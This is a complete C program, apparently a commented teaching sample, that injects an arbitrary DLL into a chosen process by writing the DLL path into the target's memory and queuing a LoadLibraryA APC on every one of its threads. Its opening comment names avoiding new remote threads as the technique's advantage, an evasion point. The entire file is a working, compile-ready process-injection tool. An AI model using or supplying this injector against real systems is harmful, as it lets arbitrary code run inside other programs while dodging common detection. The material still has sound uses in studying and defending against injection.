#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

// The advantage to this technique is that we aren't creating a new thread in a remote process.
// To ensure our function gets executed, we queue an APC on every thread in our target process. 
// Once any thread in that process enters an alertable state, our DLL is loaded and executed.

// Compile with: cl /DUNICODE /D_UNICODE InjectWithApc.c

// To get a list of threads for a target process, we have to enumerate all of the threads
// in the entire system and just filter out the ones that have the PID we're targeting
DWORD* GetThreads(IN DWORD pid, OUT DWORD* count) {
	*count = 0;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("Error grabbing snapshot: %u\n", GetLastError());
		return NULL;
	}

	// Struct to contain thread details
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(te);

	// Skip the first thread (usually system idle)
	if (!Thread32First(hSnapshot, &te)) {
		CloseHandle(hSnapshot);
		return NULL;
	}

	// When allocating memory, we don't know how many threads we'll eventually enumerate so we start
	// small (32) and realloc when we need more capacity

	// Initial memory allocation is for 32 DWORDs (32-bit unsigned ints) - we'll grow this as necessary
	SIZE_T capacity = 32; // SIZE_T is what sizeof() returns 
	
	// malloc returns a void pointer which we cast to a DWORD pointer
	// tids will point to a block of memory big enough for 32 DWORDs
	DWORD* tids = (DWORD*)malloc(capacity * sizeof(DWORD)); // 32 x 4 = 128 bytes

	do {
		// If the pid of the enumerated thread is associated with the pid we're targeting, we'll add it to our array of tids
		if (te.th32OwnerProcessID == pid) {
			// Grow array if necessary
			if (*count >= capacity) {
				// Double our capacity
				capacity *= 2;

				DWORD* temp = (DWORD*)realloc(tids, capacity * sizeof(DWORD));
				if (!temp) {
					free(tids);
					CloseHandle(hSnapshot);
					return NULL;
				}
				tids = temp; // this could be the same address from our initial malloc call or a different one
			}
			// Store any TID that is associated with our target process
			tids[(*count)++] = te.th32ThreadID;
		}
	} while (Thread32Next(hSnapshot, &te));
	
	CloseHandle(hSnapshot);
	return tids;
}

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("Usage: InjectWithApc [pid] [dllpath]\n");
		return 0;
	}

	int pid = strtol(argv[1], NULL, 0);

	// Open a handle to target process (the one we're injecting into)
	HANDLE hProcess = OpenProcess(
		PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess) {
		printf("Failed to open process (%u)\n", GetLastError());
		return 1;
	}

	// Write our DLL path into target process
	// Instead of using strlen for buffer size we could just ask for 4kb because that's the min
	// we'll get with VirtualAlloc anyway (and it's more than enough for our path)
	void* buffer = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!buffer) {
		return 1;
	}

	// NOTE: We don't need to add + 1 to strlen to include the NULL terminator because when we allocate
	// memory with VirtualAlloc it's zeroed out already - so our string will be NULL terminated
	if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), NULL)) {
		return 1;
	}

	// Find the list of threads in target process
	DWORD count; // This is the number of threads that exist in our target process
	DWORD* threads = GetThreads(pid, &count);
	if (threads == NULL) {
		printf("No threads found\n");
		return 1;
	}

	// Function to call with our APC
	PAPCFUNC f = (PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA");

	for (DWORD i = 0; i < count; i++) {
		DWORD tid = threads[i];

		// We need to open a handle to thread to pass to QueueUserApc
		HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
		if (hThread) {
			QueueUserAPC(f, hThread, (ULONG_PTR)buffer);
			printf("Queued APC to thread: %u\n", tid);
			CloseHandle(hThread);
		}
	}
	CloseHandle(hProcess);
	return 0;
}
